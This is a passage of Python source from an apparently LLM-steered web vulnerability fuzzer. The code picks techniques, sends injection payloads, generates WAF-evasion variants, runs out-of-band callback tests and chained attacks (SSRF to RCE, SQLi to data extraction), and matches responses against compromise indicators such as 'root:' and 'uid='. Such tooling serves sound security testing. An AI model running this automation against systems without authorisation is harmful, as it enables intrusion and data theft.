                    if form.get('password_field_id'):
                        discovery_insights += f"    Password field: {form.get('password_field_id')}\n"
                    if form.get('username_field_id'):
                        discovery_insights += f"    Username field: {form.get('username_field_id')}\n"
        
        return f"""Current fuzzing context:
```json
{json.dumps(context, indent=2)}
```
{technique_constraint}
{intelligent_recon_insights}
{llm_analysis_insights}
{recon_insights}
{discovery_insights}
Based on this context, what should be the next action? Consider:
1. Technology stack detected: {fingerprint_info.get('technologies', []) if fingerprint_info else 'unknown'}
2. WAF status: {context.get('waf_detected', 'none')} - consider evasion if blocking detected
3. Have we thoroughly tested the current endpoint?
4. Are there interesting responses that need deeper investigation?
5. Should we try a different technique or move to the next endpoint?
6. Have we found enough evidence to report a vulnerability?
7. For confirmed vulnerabilities, should we generate PoC?
8. Should we try BLIND DETECTION (time-based) if normal payloads show no difference?
9. Can we CHAIN ATTACKS for higher impact? (e.g., SSRF→RCE, SQLi→Data Exfil)
10. Should we DISCOVER new endpoints from response content?
11. Baseline response time is {self.session.baseline_response_time:.0f}ms - use for blind detection comparison
12. IMPORTANT: Review INTELLIGENT and PASSIVE reconnaissance for auth mechanisms, security features, and attack recommendations!
13. USE recommended techniques from intelligent reconnaissance when choosing what to test!

Available attack chains: {list(ATTACK_CHAIN_TEMPLATES.keys())}
Discovered parameters on target: {target.discovered_params if target else []}

Respond with your analysis and decision in JSON format."""
    
    async def _get_llm_decision(self, context: str) -> Dict[str, Any]:
        """Get decision from LLM."""
        self.conversation_history.append({"role": "user", "content": context})
        
        try:
            response = await call_llm(self.conversation_history)
            self.conversation_history.append({"role": "assistant", "content": response})
            
            # Keep conversation history manageable
            if len(self.conversation_history) > 20:
                # Keep system prompt and last 18 messages
                self.conversation_history = [
                    self.conversation_history[0]
                ] + self.conversation_history[-18:]
            
            return parse_llm_response(response)
            
        except Exception as e:
            logger.error(f"LLM call failed: {e}")
            return {
                "analysis": f"LLM call failed: {e}",
                "decision": "move_to_next_endpoint",
                "reasoning": "Falling back due to LLM error",
                "priority_score": 0.5,
            }
    
    async def _handle_select_technique(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Handle technique selection."""
        technique_name = decision.get("technique", "sql_injection")
        
        try:
            technique = FuzzingTechnique(technique_name)
        except ValueError:
            technique = FuzzingTechnique.SQL_INJECTION
        
        # ENFORCE SCAN PROFILE TECHNIQUE CONSTRAINTS
        if self.session.enabled_techniques:
            if technique not in self.session.enabled_techniques:
                # Log the constraint violation
                logger.warning(f"Technique {technique.value} not in scan profile, selecting alternative")
                
                # Select the first untried technique from allowed list
                target = self.session.targets[self.session.current_target_index] if self.session.targets else None
                tried_techniques = self.session.techniques_tried.get(target.url if target else "", [])
                
                for allowed_tech in self.session.enabled_techniques:
                    if allowed_tech.value not in tried_techniques:
                        technique = allowed_tech
                        break
                else:
                    # All allowed techniques tried, use first one
                    technique = self.session.enabled_techniques[0]
                
                return {
                    "type": "technique_constrained",
                    "requested": technique_name,
                    "selected": technique.value,
                    "message": f"Scan profile constraint: using {technique.value} instead of {technique_name}",
                    "allowed_techniques": [t.value for t in self.session.enabled_techniques],
                }
        
        self.session.current_technique = technique
        self.session.current_phase = FuzzingPhase.PAYLOAD_EXECUTION
        
        # Get payloads
        custom_payloads = decision.get("payloads", [])
        payloads = get_payloads_for_technique(technique, custom_payloads)
        
        # Execute fuzzing
        target = self.session.targets[self.session.current_target_index]
        results = []
        
        for payload in payloads[:15]:  # Limit payloads per iteration
            result = await execute_fuzzing_request(target, payload)
            results.append(result)
            self.session.total_requests += 1
            
            self.session.fuzzing_history.append({
                "type": "request",
                "technique": technique.value,
                "payload": payload,
                "status_code": result.get("status_code"),
                "response_time": result.get("response_time"),
                "body_length": result.get("body_length"),
                "error": result.get("error"),
            })
        
        # Track technique tried
        if target.url not in self.session.techniques_tried:
            self.session.techniques_tried[target.url] = []
        if technique.value not in self.session.techniques_tried[target.url]:
            self.session.techniques_tried[target.url].append(technique.value)
        
        self.session.current_phase = FuzzingPhase.RESULT_ANALYSIS
        
        return {
            "type": "fuzzing_complete",
            "technique": technique.value,
            "payloads_sent": len(results),
            "results_summary": {
                "success": sum(1 for r in results if r.get("success")),
                "errors": sum(1 for r in results if not r.get("success")),
                "status_codes": list(set(r.get("status_code") for r in results if r.get("success"))),
            },
        }
    
    async def _handle_generate_payloads(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Handle payload generation with context-aware intelligence."""
        payloads = decision.get("payloads", [])
        
        target = self.session.targets[self.session.current_target_index]
        technique = self.session.current_technique.value if self.session.current_technique else "sqli"
        
        # Enhance payloads with context-aware generation
        if not payloads or len(payloads) < 5:
            # Extract parameters from target
            url_params = _attack_surface_mapper.extract_params_from_url(target.url)
            body_params = []
            if target.body:
                content_type = target.headers.get("Content-Type", "application/x-www-form-urlencoded")
                body_params = _attack_surface_mapper.extract_params_from_body(target.body, content_type)
            
            all_params = url_params + body_params
            
            # Generate context-aware payloads for each parameter
            for param in all_params[:3]:  # Top 3 parameters
                param_context = ParameterContext(
                    name=param.name,
                    inferred_type=param.inferred_type,
                    sample_value=param.sample_value,
                    position=param.location,
                    encoding="json" if "json" in target.headers.get("Content-Type", "").lower() else None,
                    technology_hints=[target.fingerprint.framework] if target.fingerprint and target.fingerprint.framework else [],
                )
                
                # Get technology from fingerprint if available
                technology = None
                if target.fingerprint:
                    tech_stack = target.fingerprint.technologies or []
                    if tech_stack:
                        technology = tech_stack[0]
                    if not technology and target.fingerprint.framework:
                        technology = target.fingerprint.framework
                
                context_payloads = _payload_generator.generate_payloads(
                    param_context, technique, technology, max_payloads=10
                )
                payloads.extend(context_payloads)
        
        if not payloads:
            # Fallback to rule-based payloads
            payloads = _graceful_degradation.get_rule_based_payloads(technique)
        
        if not payloads:
            return {"type": "no_payloads", "message": "No payloads generated"}
        
        # Deduplicate payloads
        seen = set()
        unique_payloads = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)
        payloads = unique_payloads[:20]
        
        results = []
        baseline_result = await execute_fuzzing_request(target, "", position="none", timeout=10)
        baseline_fingerprint = _response_analyzer.create_fingerprint(
            baseline_result.get("status_code", 200),
            baseline_result.get("body", ""),
            baseline_result.get("headers", {}),
            baseline_result.get("response_time", 0),
        )
        _response_analyzer.set_baseline(target.url, baseline_fingerprint)
        
        for payload in payloads:
            result = await execute_fuzzing_request(target, payload)
            
            # Use comprehensive analysis that integrates all engines
            comprehensive_result = _response_analyzer.comprehensive_analysis(
                url=target.url,
                method=target.method.value if hasattr(target.method, 'value') else str(target.method),
                status_code=result.get("status_code", 200),
                headers=result.get("headers", {}),
                body=result.get("body", ""),
                response_time_ms=result.get("response_time", 0),
                payload=payload,
                technique=technique,
            )
            
            result["analysis"] = {
                "is_anomaly": comprehensive_result.get("is_anomaly", False),
                "anomaly_type": comprehensive_result.get("anomaly_type"),
                "confidence": comprehensive_result.get("confidence", 0.0),
                "potential_vulns": comprehensive_result.get("potential_vulnerabilities", []),
                "info_leakage": comprehensive_result.get("details", {}).get("local_analysis", {}).get("error_patterns"),
                # Add new engine results
                "passive_findings": comprehensive_result.get("passive_findings"),
                "diffing_anomalies": comprehensive_result.get("diffing_anomalies"),
                "reflection": comprehensive_result.get("reflection"),
                "detected_waf": comprehensive_result.get("detected_waf"),
            }
            
            results.append(result)
            
            # Record mutation feedback if WAF was detected
            detected_waf = comprehensive_result.get("detected_waf")
            if MUTATION_ENGINE_AVAILABLE and detected_waf:
                # Determine if the request was blocked
                blocked = result.get("status_code", 200) in [403, 429, 503]
                record_mutation_feedback(
                    payload=payload,
                    category="encoding",  # Default category
                    success=comprehensive_result.get("confidence", 0) > 0.7,
                    blocked=blocked,
                    response_code=result.get("status_code", 200),
                )
            
            # Learn from successful findings
            is_anomaly = comprehensive_result.get("is_anomaly", False)
            confidence = comprehensive_result.get("confidence", 0.0)
            if is_anomaly and confidence > 0.7:
                # Find the parameter context
                url_params = _attack_surface_mapper.extract_params_from_url(target.url)
                if url_params:
                    param_ctx = ParameterContext(
                        name=url_params[0].name,
                        inferred_type=url_params[0].inferred_type,
                    )
                    _payload_generator.learn_successful_payload(param_ctx, technique, payload)
            
            self.session.fuzzing_history.append({
                "type": "custom_payload",
                "payload": payload,
                "status_code": result.get("status_code"),
                "response_time": result.get("response_time"),
                "body_length": result.get("body_length"),
                "analysis": result.get("analysis"),
            })
        
        # Summarize anomalies found
        anomalies = [r for r in results if r.get("analysis", {}).get("is_anomaly")]
        
        return {
            "type": "custom_payloads_executed",
            "payloads_count": len(results),
            "results": results,
            "anomalies_found": len(anomalies),
            "potential_vulns": list(set(
                v for r in anomalies 
                for v in r.get("analysis", {}).get("potential_vulns", [])
            )),
        }
    
    async def _handle_analyze_results(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Handle result analysis - check if LLM found a vulnerability."""
        finding_data = decision.get("finding")
        
        if finding_data and isinstance(finding_data, dict):
            technique = finding_data.get("technique", "unknown")
            exploitable = finding_data.get("exploitable", False)
            
            # Calculate CVSS score
            cvss_score, cvss_vector = calculate_cvss(
                technique=technique,
                exploitable=exploitable,
                requires_auth=finding_data.get("requires_auth", False),
                user_interaction=finding_data.get("user_interaction", False),
            )
            
            # Determine severity from CVSS if not provided
            severity = finding_data.get("severity")
            if not severity:
                if cvss_score >= 9.0:
                    severity = "critical"
                elif cvss_score >= 7.0:
                    severity = "high"
                elif cvss_score >= 4.0:
                    severity = "medium"
                elif cvss_score >= 0.1:
                    severity = "low"
                else:
                    severity = "info"
            
            target = self.session.targets[self.session.current_target_index]
            
            # Generate proof of concept
            poc = ""
            if exploitable and finding_data.get("payload"):
                poc = generate_proof_of_concept(
                    technique=technique,
                    endpoint=target.url,
                    method=target.method,
                    payload=finding_data.get("payload", ""),
                    headers=target.headers,
                )
            
            # FALSE POSITIVE FILTERING
            # Minimum confidence threshold to reduce false positives
            confidence = finding_data.get("confidence", 0.7)
            evidence = finding_data.get("evidence", [])
            
            # Validate that we have actual evidence
            has_valid_evidence = bool(evidence and any(
                len(str(e)) > 10 for e in evidence if e
            ))
            
            # Confidence thresholds for different scenarios
            MIN_CONFIDENCE_NO_EVIDENCE = 0.85  # Higher bar without evidence
            MIN_CONFIDENCE_WITH_EVIDENCE = 0.5  # Lower bar with evidence
            MIN_CONFIDENCE_EXPLOITABLE = 0.4   # Even lower if exploitable
            
            # Apply false positive filtering
            confidence_threshold = MIN_CONFIDENCE_WITH_EVIDENCE if has_valid_evidence else MIN_CONFIDENCE_NO_EVIDENCE
            if exploitable:
                confidence_threshold = MIN_CONFIDENCE_EXPLOITABLE
            
            if confidence < confidence_threshold:
                # Track as potential but unverified
                self.session.fuzzing_history.append({
                    "type": "potential_finding_filtered",
                    "reason": "low_confidence",
                    "technique": technique,
                    "confidence": confidence,
                    "threshold": confidence_threshold,
                    "had_evidence": has_valid_evidence,
                })
                return {
                    "type": "finding_filtered",
                    "reason": "insufficient_confidence",
                    "confidence": confidence,
                    "threshold": confidence_threshold,
                    "message": f"Finding filtered: confidence {confidence:.2f} below threshold {confidence_threshold:.2f}",
                }
            
            finding = FuzzingFinding(
                id=str(uuid.uuid4())[:8],
                technique=technique,
                severity=severity,
                title=finding_data.get("title", "Potential Vulnerability"),
                description=finding_data.get("description", ""),
                payload=finding_data.get("payload", ""),
                evidence=evidence,
                endpoint=target.url,
                parameter=finding_data.get("parameter"),
                recommendation=finding_data.get("recommendation", ""),
                confidence=confidence,
                exploitable=exploitable,
                cvss_score=cvss_score,
                cvss_vector=cvss_vector,
                proof_of_concept=poc,
                remediation_priority="critical" if cvss_score >= 9.0 else "high" if cvss_score >= 7.0 else "medium",
                cwe_id=finding_data.get("cwe_id"),
            )
            
            # Check for duplicates before adding
            is_dup, dup_reason = _finding_deduplicator.is_duplicate(finding)
            if is_dup:
                self.session.duplicate_findings_skipped += 1
                return {
                    "type": "duplicate_finding_skipped",
                    "finding": finding.to_dict(),
                    "reason": dup_reason,
                    "message": f"Duplicate finding skipped: {dup_reason}",
                }
            
            # Add finding to deduplicator tracking
            _finding_deduplicator.add_finding(finding)
            self.session.findings.append(finding)
            
            return {
                "type": "finding_recorded",
                "finding": finding.to_dict(),
                "cvss_score": cvss_score,
                "has_poc": bool(poc),
                "is_unique": True,
            }
        
        return {
            "type": "analysis_complete",
            "message": decision.get("analysis", "No significant findings"),
        }
    
    async def _handle_evade_waf(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Handle WAF evasion attempts."""
        self.session.current_phase = FuzzingPhase.WAF_EVASION
        
        payloads = decision.get("payloads", [])
        encodings = decision.get("evasion_encodings", ["url", "double_url", "hex"])
        target = self.session.targets[self.session.current_target_index]
        
        # Detect WAF type if we have fingerprint
        waf_type = WafType.UNKNOWN
        if target.fingerprint and target.fingerprint.waf:
            waf_type = target.fingerprint.waf
        
        results = []
        for payload in payloads[:5]:
            # Generate evasion variants
            variants = generate_evasion_payloads(payload, waf_type)
            
            for variant in variants[:5]:
                result = await execute_fuzzing_request(target, variant)
                results.append(result)
                
                self.session.fuzzing_history.append({
                    "type": "waf_evasion",
                    "original_payload": payload,
                    "evasion_payload": variant,
                    "status_code": result.get("status_code"),
                    "blocked": result.get("status_code") in [403, 406, 429],
                })
                
                # If not blocked, we found an evasion
                if result.get("status_code") not in [403, 406, 429]:
                    break
        
        successful = [r for r in results if r.get("status_code") not in [403, 406, 429]]
        
        return {
            "type": "waf_evasion_complete",
            "attempts": len(results),
            "successful_evasions": len(successful),
            "results": results,
        }
    
    async def _handle_exploit_finding(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Handle exploitation attempt of a finding."""
        self.session.current_phase = FuzzingPhase.EXPLOITATION
        
        exploit_payloads = decision.get("payloads", [])
        target = self.session.targets[self.session.current_target_index]
        
        results = []
        for payload in exploit_payloads[:10]:
            result = await execute_fuzzing_request(target, payload)
            results.append(result)
            
            self.session.fuzzing_history.append({
                "type": "exploitation",
                "payload": payload,
                "status_code": result.get("status_code"),
                "response_time": result.get("response_time"),
            })
        
        return {
            "type": "exploitation_attempted",
            "payloads_tried": len(results),
            "results": results,
        }
    
    async def _handle_blind_detection(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Handle blind vulnerability detection using time-based or OOB techniques."""
        self.session.current_phase = FuzzingPhase.BLIND_DETECTION
        
        target = self.session.targets[self.session.current_target_index]
        blind_config = decision.get("blind_detection", {})
        detection_type = blind_config.get("type", "time_based")
        delay_seconds = blind_config.get("delay_seconds", 5)
        technique = decision.get("technique", "sql_injection")
        
        results = []
        
        if detection_type == "time_based":
            # Get baseline response time if not set
            if self.session.baseline_response_time == 0:
                baseline_result = await execute_fuzzing_request(target, "", position="none")
                self.session.baseline_response_time = baseline_result.get("response_time", 500)
            
            # Get time-based payloads
            payloads = get_blind_payloads(technique, "")
            
            for payload in payloads[:5]:
                result = await execute_fuzzing_request(target, payload, timeout=delay_seconds + 10)
                response_time = result.get("response_time", 0)
                time_diff = response_time - self.session.baseline_response_time
                
                detected = time_diff > (delay_seconds * 1000 * 0.8)  # 80% of expected delay
                
                blind_result = BlindDetectionResult(
                    technique=technique,
                    detected=detected,
                    detection_method="time_based",
                    baseline_time=self.session.baseline_response_time,
                    payload_time=response_time,
                    time_difference=time_diff,
                    confidence=min(time_diff / (delay_seconds * 1000), 1.0) if detected else 0.0,
                )
                
                self.session.blind_detection_results.append(blind_result)
                results.append(blind_result.to_dict())
                
                self.session.fuzzing_history.append({
                    "type": "blind_time_based",
                    "technique": technique,
                    "payload": payload,
                    "baseline_ms": self.session.baseline_response_time,
                    "response_ms": response_time,
                    "detected": detected,
                })
                
                if detected:
                    # Create finding for blind vulnerability
                    finding = FuzzingFinding(
                        id=str(uuid.uuid4())[:8],
                        technique=technique,
                        severity="high",
                        title=f"Blind {technique.replace('_', ' ').title()} Detected (Time-based)",
                        description=f"Time-based blind {technique} detected. Response time increased by {time_diff:.0f}ms when using delay payload.",
                        payload=payload,
                        evidence=[
                            f"Baseline response time: {self.session.baseline_response_time:.0f}ms",
                            f"Payload response time: {response_time:.0f}ms",
                            f"Time difference: {time_diff:.0f}ms (expected ~{delay_seconds * 1000}ms)",
                        ],
                        endpoint=target.url,
                        exploitable=True,
                        confidence=blind_result.confidence,
                        cwe_id="CWE-89" if "sql" in technique else "CWE-78",
                    )
                    
                    # Calculate CVSS
                    cvss_score, cvss_vector = calculate_cvss(technique, True)
                    finding.cvss_score = cvss_score
                    finding.cvss_vector = cvss_vector
                    
                    self.session.findings.append(finding)
                    break  # Found blind vuln, stop testing
        
        elif detection_type == "oob_callback":
            # Out-of-band detection using the OOB callback service
            if OOB_SERVICE_AVAILABLE:
                # Use the actual OOB callback service
                callback_domain = blind_config.get("callback_domain", "localhost")
                callback_port = blind_config.get("callback_port", 8080)
                callback_protocol = blind_config.get("callback_protocol", "http")
                
                manager = create_callback_manager(
                    domain=callback_domain,
                    port=callback_port,
                    protocol=callback_protocol,
                )
                generator = create_payload_generator(manager)
                
                # Map technique to vulnerability type
                vuln_type_map = {
                    "sql_injection": VulnerabilityType.BLIND_SQLI,
                    "ssrf": VulnerabilityType.SSRF,
                    "xxe": VulnerabilityType.XXE,
                    "command_injection": VulnerabilityType.RCE,
                    "ssti": VulnerabilityType.SSTI,
                    "path_traversal": VulnerabilityType.LFI,
                }
                vuln_type = vuln_type_map.get(technique, VulnerabilityType.UNKNOWN)
                
                # Generate OOB payloads with real callback tokens
                method_map = {
                    VulnerabilityType.BLIND_SQLI: generator.get_blind_sqli_payloads,
                    VulnerabilityType.SSRF: generator.get_ssrf_payloads,
                    VulnerabilityType.XXE: generator.get_xxe_payloads,
                    VulnerabilityType.RCE: generator.get_rce_payloads,
                    VulnerabilityType.SSTI: generator.get_ssti_payloads,
                    VulnerabilityType.LFI: generator.get_lfi_payloads,
                }
                
                payload_generator = method_map.get(vuln_type)
                if payload_generator:
                    oob_payloads = payload_generator(
                        self.session.id,
                        target.url,
                        target.parameters[0] if target.parameters else "param",
                    )
                    
                    # Send requests with OOB payloads
                    for payload, token in oob_payloads[:5]:
                        result = await execute_fuzzing_request(target, payload)
                        callback_url = manager.get_callback_url(token)
                        
                        results.append({
                            "payload": payload,
                            "token": token.token,
                            "callback_url": callback_url,
                            "status": result.get("status_code"),
                            "note": "Token registered - check for callbacks",
                        })
                        
                        self.session.fuzzing_history.append({
                            "type": "blind_oob",
                            "technique": technique,
                            "payload": payload,
                            "callback_url": callback_url,
                            "token": token.token,
                        })
                    
                    # Wait longer and poll periodically for callbacks
                    # OOB callbacks can take time (DNS resolution, delayed processing, etc.)
                    oob_wait_time = blind_config.get("oob_wait_seconds", 15)
                    poll_interval = 3  # Check every 3 seconds
                    callbacks_found = []
                    store = get_callback_store()
                    
                    for elapsed in range(0, oob_wait_time, poll_interval):
                        await asyncio.sleep(poll_interval)
                        
                        # Check if any callbacks were received
                        new_callbacks = store.get_events_by_scan(self.session.id)
                        
                        # Filter out already-processed callbacks
                        for callback in new_callbacks:
                            if callback not in callbacks_found:
                                callbacks_found.append(callback)
                                
                                blind_result = BlindDetectionResult(
                                    technique=technique,
                                    detected=True,
                                    detection_method="oob_callback",
                                    callback_received=True,
                                    callback_data=json.dumps({
                                        "source_ip": callback.source_ip,
                                        "callback_type": callback.callback_type.value,
                                        "timestamp": callback.timestamp.isoformat(),
                                    }),
                                    confidence=0.95,
                                )
                                self.session.blind_detection_results.append(blind_result)
                                
                                # Create finding for confirmed blind vulnerability
                                finding = FuzzingFinding(
                                    id=str(uuid.uuid4())[:8],
                                    technique=technique,
                                    severity="critical",
                                    title=f"Blind {technique.replace('_', ' ').title()} Confirmed (OOB Callback)",
                                    description=f"Out-of-band callback received, confirming blind {technique}. "
                                                f"Callback from {callback.source_ip} at {callback.timestamp.isoformat()}.",
                                    payload=callback.correlated_payload or "unknown",
                                    evidence=[
                                        f"OOB callback received from: {callback.source_ip}",
                                        f"Callback type: {callback.callback_type.value}",
                                        f"Original endpoint: {callback.correlated_endpoint}",
                                        f"Original parameter: {callback.correlated_parameter}",
                                        f"Detection time: {elapsed + poll_interval}s after payload sent",
                                    ],
                                    endpoint=target.url,
                                    exploitable=True,
                                    confidence=0.95,
                                    cwe_id="CWE-918" if technique == "ssrf" else "CWE-611" if technique == "xxe" else "CWE-78",
                                )
                                
                                cvss_score, cvss_vector = calculate_cvss(technique, True)
                                finding.cvss_score = cvss_score
                                finding.cvss_vector = cvss_vector
                                
                                self.session.findings.append(finding)
                                results.append(blind_result.to_dict())
            else:
                # Fallback to simple placeholder URL
                callback_base = blind_config.get("callback_url", f"http://callback.{self.session.callback_token}.oob.local")
                payloads = get_blind_payloads(technique, callback_base)
                
                for payload in payloads[:5]:
                    result = await execute_fuzzing_request(target, payload)
                    results.append({
                        "payload": payload,
                        "callback_url": callback_base,
                        "status": result.get("status_code"),
                        "note": "OOB service not available - using placeholder URL",
                    })
                    
                    self.session.fuzzing_history.append({
                        "type": "blind_oob",
                        "technique": technique,
                        "payload": payload,
                        "callback_url": callback_base,
                    })
        
        return {
            "type": "blind_detection_complete",
            "detection_type": detection_type,
            "technique": technique,
            "results": results,
            "baseline_time": self.session.baseline_response_time,
        }
    
    async def _handle_chain_attack(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Handle multi-step chained attack execution."""
        self.session.current_phase = FuzzingPhase.CHAIN_EXPLOITATION
        
        chain_config = decision.get("attack_chain", {})
        chain_name = chain_config.get("name", "")
        step_payloads = chain_config.get("step_payloads", [])
        
        # Get or create attack chain
        existing_chain = None
        for chain in self.session.attack_chains:
            if chain.name == chain_name and chain.status == "in_progress":
                existing_chain = chain
                break
        
        if not existing_chain:
            # Create new chain from template
            template = ATTACK_CHAIN_TEMPLATES.get(chain_name)
            if not template:
                return {"type": "chain_error", "error": f"Unknown chain template: {chain_name}"}
            
            steps = [
                AttackChainStep(
                    order=i,
                    technique=step["technique"],
                    payload=step["payload"],
                    expected_outcome=step["expected"],
                )
                for i, step in enumerate(template["steps"])
            ]
            
            existing_chain = AttackChain(
                id=str(uuid.uuid4())[:8],
                name=template["name"],
                description=template["description"],
                steps=steps,
                status="in_progress",
            )
            self.session.attack_chains.append(existing_chain)
        
        # Execute current step
        current_step = existing_chain.steps[existing_chain.current_step]
        target = self.session.targets[self.session.current_target_index]
        
        # Use step_payloads if provided, otherwise use template payload
        payload = step_payloads[0] if step_payloads else current_step.payload
        result = await execute_fuzzing_request(target, payload)
        
        # Analyze result for expected outcome
        success = False
        data_extracted = None
        
        body = result.get("body", "").lower()
        expected = current_step.expected_outcome.lower()
        
        # Check for success indicators based on expected outcome
        success_indicators = {
            "internal_access": ["localhost", "127.0.0.1", "internal", "private"],
            "cloud_metadata": ["ami-id", "instance-id", "meta-data", "iam"],
            "command_execution": ["uid=", "root:", "www-data", "apache"],
            "column_count": ["unknown column", "order by", "syntax error"],
            "table_names": ["users", "admin", "accounts", "customers"],
            "column_names": ["password", "email", "username", "token"],
            "credentials": ["hash", "password", "secret", "@"],
            "log_access": ["[error]", "[notice]", "apache", "nginx", "access_log"],
            "log_poisoning": ["<?php", "system(", "exec("],
            "rce": ["uid=", "root", "www-data", "daemon"],
            "xxe_confirmed": ["root:", "/bin/bash", "etc/passwd"],
            "internal_scan": ["connection refused", "timeout", "200 ok"],
            "file_read": ["root:", "nobody", "daemon"],
            "login_bypass": ["welcome", "dashboard", "admin", "logged in"],
            "admin_access": ["admin", "administrator", "superuser"],
            "privilege_escalation": ["role", "permission", "elevated"],
        }
        
        indicators = success_indicators.get(expected, [expected])
        for indicator in indicators:
            if indicator in body:
                success = True
                # Extract relevant data
                data_extracted = body[:500]
                break
        
        current_step.success = success
        current_step.actual_outcome = body[:200] if body else "No response"
        current_step.data_extracted = data_extracted
        
        self.session.fuzzing_history.append({
            "type": "chain_step",
            "chain": existing_chain.name,
            "step": existing_chain.current_step,
            "technique": current_step.technique,
            "payload": payload,
            "success": success,
            "expected": current_step.expected_outcome,
        })
        
        # Advance chain or complete
        if success:
            existing_chain.current_step += 1
            
            if existing_chain.current_step >= len(existing_chain.steps):
                # Chain completed successfully
                existing_chain.status = "success"
                existing_chain.final_impact = f"Full {chain_name} chain exploitation successful"
                
                # Create comprehensive finding
                finding = FuzzingFinding(
                    id=str(uuid.uuid4())[:8],
                    technique=existing_chain.steps[-1].technique,
                    severity="critical",
                    title=f"Chained Attack: {existing_chain.name}",
                    description=f"{existing_chain.description}\n\nAll {len(existing_chain.steps)} steps successful.",
                    payload=" → ".join([s.payload for s in existing_chain.steps]),
                    evidence=[f"Step {s.order+1} ({s.technique}): {s.actual_outcome[:100]}" for s in existing_chain.steps],
                    endpoint=target.url,
                    exploitable=True,
                    confidence=1.0,
                    recommendation="Critical: Multiple chained vulnerabilities allow complete compromise. Address all vulnerabilities in the chain.",
                )
                
                cvss_score, cvss_vector = calculate_cvss(existing_chain.steps[-1].technique, True)
                finding.cvss_score = min(cvss_score + 1.0, 10.0)  # Boost CVSS for chains
                finding.cvss_vector = cvss_vector
                finding.proof_of_concept = generate_proof_of_concept(
                    existing_chain.steps[-1].technique,
                    target.url,
                    target.method,
                    existing_chain.steps[-1].payload,
                    target.headers,
                )
                
                self.session.findings.append(finding)
                
                return {
                    "type": "chain_complete",
                    "chain": existing_chain.to_dict(),
                    "impact": existing_chain.final_impact,
                }
        else:
            # Step failed, chain failed
            existing_chain.status = "failed"
            return {
                "type": "chain_step_failed",
                "chain": existing_chain.to_dict(),
                "failed_step": existing_chain.current_step,
                "reason": f"Expected '{current_step.expected_outcome}' but got '{current_step.actual_outcome[:100]}'",
            }
        
        return {
            "type": "chain_step_complete",
            "chain": existing_chain.to_dict(),
            "current_step": existing_chain.current_step,
            "next_step": existing_chain.steps[existing_chain.current_step].technique if existing_chain.current_step < len(existing_chain.steps) else None,
        }
    
    async def _handle_discover_endpoints(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Handle auto-discovery of new endpoints and parameters."""
        self.session.current_phase = FuzzingPhase.DISCOVERY
        
        target = self.session.targets[self.session.current_target_index]
        
        # Fetch the current target
        result = await execute_fuzzing_request(target, "", position="none")
        
        if not result.get("success"):
            return {"type": "discovery_failed", "error": result.get("error")}
        
        body = result.get("body", "")
        headers = result.get("headers", {})
        content_type = headers.get("content-type", "")
        
        discovered = []
        
        # Discover from HTML
        if "html" in content_type.lower() or body.strip().startswith("<"):
            html_endpoints = discover_endpoints_from_html(body, target.url)
            discovered.extend(html_endpoints)
        
        # Discover from JSON
        if "json" in content_type.lower() or body.strip().startswith("{"):
            json_endpoints = discover_endpoints_from_json(body, target.url)
            discovered.extend(json_endpoints)
        
        # Discover parameters
        discovered_params = discover_parameters_from_response(body, content_type)
        
        # Filter duplicates and existing targets
        existing_urls = {t.url for t in self.session.targets}
        new_endpoints = []
        
        for endpoint in discovered:
            if endpoint.url not in existing_urls:
                existing_urls.add(endpoint.url)
                new_endpoints.append(endpoint)
                self.session.discovered_endpoints.append(endpoint)
        
        # Add discovered parameters to current target
        if discovered_params:
            target.discovered_params.extend(discovered_params)
            target.discovered_params = list(set(target.discovered_params))
        
        self.session.fuzzing_history.append({
            "type": "discovery",
            "source_url": target.url,
            "new_endpoints": len(new_endpoints),
            "new_parameters": len(discovered_params),
        })
        
        # Optionally add discovered endpoints as new targets
        discovery_config = decision.get("discovery", {})
        add_to_targets = discovery_config.get("add_to_targets", True)
        
        if add_to_targets and new_endpoints:
            for endpoint in new_endpoints[:10]:  # Limit to 10 new targets
                new_target = FuzzingTarget(
                    url=endpoint.url,
                    method=endpoint.method,
                    headers=dict(target.headers),
                    parameters=endpoint.parameters,
                )
                self.session.targets.append(new_target)
        
        return {
            "type": "discovery_complete",
            "endpoints_found": [e.to_dict() for e in new_endpoints],
            "parameters_found": discovered_params,
            "added_to_targets": add_to_targets,
            "total_targets": len(self.session.targets),
        }
    
    async def _handle_move_to_next(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Move to next endpoint."""
        self.session.current_target_index += 1
        self.session.current_technique = None
        self.session.current_phase = FuzzingPhase.RECONNAISSANCE
        
        if self.session.current_target_index >= len(self.session.targets):
            self.session.status = "completed"
            return {
                "type": "all_targets_complete",
                "message": "All targets have been fuzzed",
            }
        
        return {
            "type": "moved_to_next_target",
            "target_index": self.session.current_target_index,
            "target": self.session.targets[self.session.current_target_index].to_dict(),
        }
    
    async def _handle_map_attack_surface(self, decision: Dict[str, Any]) -> Dict[str, Any]:
        """Handle comprehensive attack surface mapping for a target."""
        target = self.session.targets[self.session.current_target_index]
        
        # Build endpoint profile
        profile = await _attack_surface_mapper.build_endpoint_profile(target)
        
        results = {
            "type": "attack_surface_mapped",
            "url": target.url,
            "discovered_params": [
                {
                    "name": p.name,
                    "location": p.location,
                    "type": p.inferred_type.value,
                    "confidence": p.confidence,
                }
                for p in profile.parameters
            ],
            "injectable_headers": profile.headers_injectable,
            "methods_allowed": profile.methods_allowed,
            "content_types_accepted": profile.content_types_accepted,
            "authentication_required": profile.authentication_required,
            "waf_protected": profile.waf_protected,
        }
        
        # Add discovered parameters to target
        for discovered in profile.parameters:
            if discovered.name not in target.discovered_params:
                target.discovered_params.append(discovered.name)
        
        # Log to history
        self.session.fuzzing_history.append({
            "type": "attack_surface_mapping",
            "url": target.url,
            "params_found": len(profile.parameters),
            "headers_injectable": len(profile.headers_injectable),
            "methods": profile.methods_allowed,
        })
        
        # Generate recommendations based on findings
        recommendations = []
        
        if profile.parameters:
            param_types = [p.inferred_type.value for p in profile.parameters]
            if "url" in param_types or "file_path" in param_types:
                recommendations.append("Test for SSRF and Path Traversal on URL/file parameters")
            if "search" in param_types or "id" in param_types:
                recommendations.append("Test for SQL Injection on search and ID parameters")
        
        if profile.headers_injectable:
